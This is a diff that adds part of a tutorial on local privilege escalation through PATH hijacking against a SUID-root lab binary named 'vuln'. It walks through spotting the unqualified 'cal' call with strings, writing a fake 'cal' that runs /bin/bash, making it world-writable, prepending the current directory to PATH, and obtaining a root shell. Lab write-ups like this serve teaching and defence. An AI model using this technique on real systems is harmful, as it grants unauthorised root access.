@@ -49,3 +49,64 @@ root@whitecr0wz:~/vuln# ls -la /usr/bin/vuln
 -rwsr-xr-x 1 root root 16712 Aug 10 19:58 /usr/bin/vuln
 root@whitecr0wz:~/vuln# 
 ```
+
+##### After this is done, just su into your user.
+
+##### If the application is run, it displays everything as intended:
+
+```term
+whitecr0wz@whitecr0wz:~/vuln$ /usr/bin/vuln
+    August 2020       
+Su Mo Tu We Th Fr Sa  
+                   1  
+ 2  3  4  5  6  7  8  
+ 9 10 11 12 13 14 15  
+16 17 18 19 20 21 22  
+23 24 25 26 27 28 29  
+30 31                 
+Usage: time [-apvV] [-f format] [-o file] [--append] [--verbose]
+       [--portability] [--format=format] [--output=file] [--version]
+       [--quiet] [--help] command [arg...]
+whitecr0wz@whitecr0wz:~/vuln$ 
+```
+
+##### Moreover, if strings is used and grepped for "cal", the system call may be found:
+
+```term
+whitecr0wz@whitecr0wz:~/vuln$ strings /usr/bin/vuln | grep cal 
+cal && time && date
+whitecr0wz@whitecr0wz:~/vuln$
+```
+
+##### The command that will be spoofed is cal, due to the fact that it is the first to be called:
+
+```term
+whitecr0wz@whitecr0wz:~/vuln$ cat cal 
+#!/bin/bash
+/bin/bash
+whitecr0wz@whitecr0wz:~/vuln$ 
+```
+
+##### The file is chmodded with 777 bits:
+
+```term
+whitecr0wz@whitecr0wz:~/vuln$ chmod 777 cal 
+```
+
+##### Now, where the fun begins, the $PATH variable is exported into the current working directory, being "/home/whitecr0wz/vuln", where "cal" will be searched for:
+
+```term
+whitecr0wz@whitecr0wz:~/vuln$ pwd 
+/home/whitecr0wz/vuln
+whitecr0wz@whitecr0wz:~/vuln$ export PATH=/home/whitecr0wz/vuln:$PATH 
+whitecr0wz@whitecr0wz:~/vuln$ echo $PATH
+/home/whitecr0wz/vuln:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+whitecr0wz@whitecr0wz:~/vuln$ 
+```
+
+##### Last but not least, vuln is executed, spoofing /usr/bin/cal for /home/whitecr0wz/vuln/cal, which leads to a root shell:
+
+```term
+whitecr0wz@whitecr0wz:~/vuln$ /usr/bin/vuln 
+root@whitecr0wz:~/vuln# 
+```
